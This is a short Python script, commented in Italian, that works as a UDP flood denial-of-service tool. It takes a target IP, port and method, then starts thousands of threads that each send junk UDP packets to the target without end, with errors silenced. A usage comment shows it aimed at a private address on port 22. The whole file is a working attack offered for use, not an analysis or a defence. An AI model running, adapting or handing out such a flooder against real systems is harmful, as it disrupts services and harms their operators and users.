import sys
import socket
import threading

# Controllo se sono stati passati tutti gli argomenti per evitare l'IndexError
if len(sys.argv) < 4:
    print("Utilizzo: python udp.py <IP> <PORTA> <METODO>")
    sys.exit()

host = str(sys.argv[1])
port = int(sys.argv[2])
method = str(sys.argv[3])

loops = 10000

def send_packet(amplifier):
    try:
        # AF_INET = IPv4, SOCK_DGRAM = UDP
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.connect((host, port))
        while True: 
            s.send(b"\x99" * amplifier)
    except:
        pass # Silenzia gli errori di connessione

def attack_HQ():
    print(f"Attacco avviato su {host}:{port} con metodo {method}...")
    
    # Seleziona l'ampiezza in base al metodo
    amp = 375
    if method == "UDP-Power": amp = 750
    
    for _ in range(loops):
        # NOTA: target riceve il nome della funzione, args i parametri
        # Questo permette di creare veri thread paralleli
        t = threading.Thread(target=send_packet, args=(amp,), daemon=True)
        t.start()
        
    if method == "UDP-Mix":
        for _ in range(loops):
            threading.Thread(target=send_packet, args=(750,), daemon=True).start()

# Avvia la funzione principale
if __name__ == "__main__":
    attack_HQ()

#                   ip       porta  modo
# python udp.py 192.168.70.130 22 UDP-Mix